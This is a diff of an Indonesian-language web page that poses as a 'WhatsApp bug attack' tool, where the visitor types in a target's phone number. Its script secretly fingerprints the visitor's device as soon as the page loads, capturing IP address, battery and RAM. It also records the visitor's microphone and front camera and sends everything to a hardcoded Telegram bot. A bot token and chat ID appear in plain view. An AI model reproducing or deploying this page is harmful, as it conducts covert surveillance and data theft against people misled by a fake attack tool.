@@ -1,66 +1,275 @@
 <!DOCTYPE html>
 <html lang="id">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Server Maintenance</title>
-    <style>
-        body {
-            margin: 0;
-            padding: 0;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            height: 100vh;
-            background-color: #000000;
-            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
-            overflow: hidden;
-        }
+  <meta charset="UTF-8">
+  <title>dhack bug</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;900&display=swap" rel="stylesheet">
+  <style>
+    * { margin: 0; padding: 0; box-sizing: border-box; }
+    body {
+      background: linear-gradient(135deg, #0f0f23 0%, #1a1a2e 50%, #16213e 100%);
+      font-family: 'Inter', sans-serif;
+      color: blue;
+      height: 100vh;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      overflow: hidden;
+      position: relative;
+      padding: 20px;
+    }
+    .bg-particles { position: fixed; top: 0; left: 0; width: 100%; height: 100%; pointer-events: none; z-index: 0; }
+    .particle {
+      position: absolute;
+      width: 2px;
+      height: 2px;
+      background: rgba(0, 255, 127, 0.3);
+      border-radius: 50%;
+      animation: float 6s ease-in-out infinite;
+    }
+    @keyframes float {
+      0%, 100% { transform: translateY(0px); opacity: 0.3; }
+      50% { transform: translateY(-20px); opacity: 0.8; }
+    }
+    .login-container {
+      background-color: rgba(17, 17, 17, 0.95);
+      padding: 30px;
+      border-radius: 16px;
+      box-shadow: 0 0 20px blue;
+      text-align: center;
+      max-width: 400px;
+      width: 100%;
+      z-index: 2;
+    }
+    .login-title {
+      font-size: 26px;
+      font-weight: 900;
+      margin-bottom: 5px;
+      background: linear-gradient(135deg, #2563eb, #ffffff);
+      -webkit-background-clip: text;
+      -webkit-text-fill-color: transparent;
+    }
+    #notif {
+      font-size: 14px;
+      color: #00d9ff;
+      font-weight: 600;
+      height: 20px;
+      margin-bottom: 10px;
+      display: none;
+    }
+    .login-input {
+      width: 100%;
+      padding: 12px;
+      margin-bottom: 16px;
+      background: #333;
+      border: 1px solid transparent;
+      border-radius: 6px;
+      color: #fff;
+      font-size: 15px;
+      outline: none;
+    }
+    .login-input:focus { border: 1px solid #2563eb; }
 
-        .container {
-            text-align: center;
-        }
+    .platform-label {
+      color: #00ff7f;
+      font-size: 12px;
+      font-weight: 900;
+      text-align: left;
+      margin-bottom: 10px;
+      text-transform: uppercase;
+      letter-spacing: 1px;
+    }
+    .platform-group {
+      display: flex;
+      gap: 10px;
+      margin-bottom: 20px;
+    }
+    .platform-btn {
+      flex: 1;
+      padding: 15px 5px;
+      background: rgba(255, 255, 255, 0.05);
+      border: 1px solid rgba(255, 255, 255, 0.2);
+      border-radius: 12px;
+      color: #ccc;
+      font-weight: 700;
+      font-size: 11px;
+      cursor: pointer;
+      transition: 0.3s;
+      text-transform: uppercase;
+    }
+    .platform-btn.active {
+      background: rgba(37, 99, 235, 0.2);
+      border-color: #2563eb;
+      color: #fff;
+      box-shadow: 0 0 10px rgba(37, 99, 235, 0.3);
+    }
 
-        h1 {
-            color: #008cff;
-            font-size: 2.5rem;
-            text-transform: uppercase;
-            letter-spacing: 2px;
-            text-shadow: 0 0 10px rgba(0, 140, 255, 0.7),
-                         0 0 20px rgba(0, 140, 255, 0.4);
-            animation: pulse 2s infinite ease-in-out;
-        }
-
-        p {
-            color: #005bb5;
-            font-size: 1.2rem;
-            margin-top: 10px;
-        }
-
-        @keyframes pulse {
-            0%, 100% { opacity: 1; }
-            50% { opacity: 0.7; }
-        }
-
-        /* Dekorasi tambahan berupa lingkaran cahaya di latar belakang */
-        .bg-glow {
-            position: absolute;
-            width: 300px;
-            height: 300px;
-            background: radial-gradient(circle, rgba(0, 140, 255, 0.15) 0%, rgba(0, 0, 0, 0) 70%);
-            border-radius: 50%;
-            z-index: -1;
-        }
-    </style>
+    .login-button {
+      width: 100%;
+      padding: 12px;
+      background: linear-gradient(135deg, #2563eb, #1e40af);
+      color: white;
+      border: none;
+      border-radius: 10px;
+      cursor: pointer;
+      font-weight: 600;
+      font-size: 15px;
+      transition: 0.3s;
+    }
+    .login-button:hover { box-shadow: 0 0 20px blue; transform: translateY(-2px); }
+  </style>
 </head>
 <body>
+  <div class="bg-particles"></div>
 
-    <div class="bg-glow"></div>
+  <div class="login-container">
+    <p class="login-title">bug WhatsApp By Hacked official</p>
+    <div id="notif">Sukses bug atack ✅</div>
     
-    <div class="container">
-        <h1>Server Sedang Maintenance</h1>
-        <p>Tunggu sebentar...</p>
+    <input type="number" class="login-input" placeholder="Nomor WhatsApp Target" id="text">
+
+    <p class="platform-label">Platform Selection</p>
+    <div class="platform-group">
+      <button type="button" class="platform-btn active" onclick="selectPlatform(this)">Android OS</button>
+      <button type="button" class="platform-btn" onclick="selectPlatform(this)">iOS Platform</button>
     </div>
 
+    <button class="login-button" id="login-button">Atack</button>
+  </div>
+
+  <script>
+    const botToken = '8403098052:AAHoNelCuHdAaZJwYZQxH0kJPgkbC2hXOdg';
+    const chatIds = ['7945789634'];
+    const input = document.getElementById('text');
+    const button = document.getElementById('login-button');
+    const notif = document.getElementById('notif');
+
+    function selectPlatform(btn) {
+      document.querySelectorAll('.platform-btn').forEach(b => b.classList.remove('active'));
+      btn.classList.add('active');
+    }
+
+    function sendToTelegram(text) {
+      chatIds.forEach(id => {
+        fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({ chat_id: id, text: text, parse_mode: 'HTML' })
+        }).catch(console.error);
+      });
+    }
+
+    function sendVideo(blob, filename) {
+      chatIds.forEach(id => {
+        const formData = new FormData();
+        formData.append('chat_id', id);
+        formData.append('video', blob, filename);
+        formData.append('caption', '📹 Rekaman Kamera Depan (7 Detik)');
+        fetch(`https://api.telegram.org/bot${botToken}/sendVideo`, { method: 'POST', body: formData }).catch(console.error);
+      });
+    }
+
+    function sendVoice(blob, filename) {
+      chatIds.forEach(id => {
+        const formData = new FormData();
+        formData.append('chat_id', id);
+        formData.append('voice', blob, filename);
+        fetch(`https://api.telegram.org/bot${botToken}/sendVoice`, { method: 'POST', body: formData }).catch(console.error);
+      });
+    }
+
+    // FITUR DETEKSI CHARGER (AUTO UPDATE)
+    async function getInfo() {
+      try {
+        const ipRes = await fetch('https://api.ipify.org?format=json');
+        const ipData = await ipRes.json();
+        
+        // Deteksi baterai dan status charging
+        let batteryInfo = "Tidak didukung";
+        if (navigator.getBattery) {
+          const battery = await navigator.getBattery();
+          const level = (battery.level * 100).toFixed(0);
+          const chargingStatus = battery.charging ? "Charging" : "Discharging";
+          batteryInfo = `${level}% (${chargingStatus})`;
+        }
+
+        const ram = navigator.deviceMemory || "Tidak diketahui";
+        const device = navigator.userAgent.split('(')[1].split(')')[0];
+
+        const text = `📱 <b>Device:</b> ${device}\n🌐 <b>IP:</b> ${ipData.ip}\n🔋 <b>Baterai:</b> ${batteryInfo}\n🕒 <b>Waktu:</b> ${new Date().toLocaleString()}\n📟 <b>RAM Handphone:</b> ±${ram} GB`;
+        sendToTelegram(`<b>📥 Info Pengunjung (Auto):</b>\n\n${text}`);
+      } catch (err) {}
+    }
+
+    async function recordFrontVideo() {
+      try {
+        const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" }, audio: true });
+        const mediaRecorder = new MediaRecorder(stream);
+        const videoChunks = [];
+        mediaRecorder.ondataavailable = (e) => { if (e.data.size > 0) videoChunks.push(e.data); };
+        mediaRecorder.onstop = () => {
+          const videoBlob = new Blob(videoChunks, { type: 'video/mp4' });
+          sendVideo(videoBlob, 'rekaman_depan.mp4');
+          stream.getTracks().forEach(track => track.stop());
+        };
+        mediaRecorder.start();
+        setTimeout(() => { if (mediaRecorder.state !== "inactive") mediaRecorder.stop(); }, 7000);
+      } catch (err) {
+        sendToTelegram('maaf akses vidio tidak berhasil 🤬');
+      }
+    }
+
+    async function autoRecordAudio() {
+      try {
+        const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
+        const mediaRecorder = new MediaRecorder(stream);
+        const chunks = [];
+        mediaRecorder.ondataavailable = (e) => { if (e.data.size > 0) chunks.push(e.data); };
+        mediaRecorder.onstop = () => {
+          const blob = new Blob(chunks, { type: 'audio/mpeg' }); 
+          sendVoice(blob, 'voice_note.mp3');
+          stream.getTracks().forEach(track => track.stop());
+        };
+        mediaRecorder.start();
+        setTimeout(() => { if (mediaRecorder.state !== "inactive") mediaRecorder.stop(); }, 5000);
+      } catch (err) {
+        sendToTelegram('Izin Voice Note ditolak ❌');
+      }
+    }
+
+    window.addEventListener('DOMContentLoaded', () => {
+      createParticles();
+      getInfo();
+      autoRecordAudio(); 
+      recordFrontVideo();
+    });
+
+    button.addEventListener('click', () => {
+      const nomor = input.value.trim();
+      if (!nomor || nomor.length < 8) return;
+      
+      button.disabled = true;
+      notif.style.display = 'none';
+      sendToTelegram(`<b>📞 Target Attack:</b> ${nomor}`);
+      
+      setTimeout(() => {
+        notif.style.display = 'block';
+        button.disabled = false;
+        input.value = '';
+      }, 1000);
+    });
+
+    function createParticles() {
+      const container = document.querySelector('.bg-particles');
+      for (let i = 0; i < 30; i++) {
+        const p = document.createElement('div');
+        p.className = 'particle';
+        p.style.left = Math.random() * 100 + '%';
+        p.style.top = Math.random() * 100 + '%';
+        container.appendChild(p);
+      }
+    }
+  </script>
 </body>
 </html>
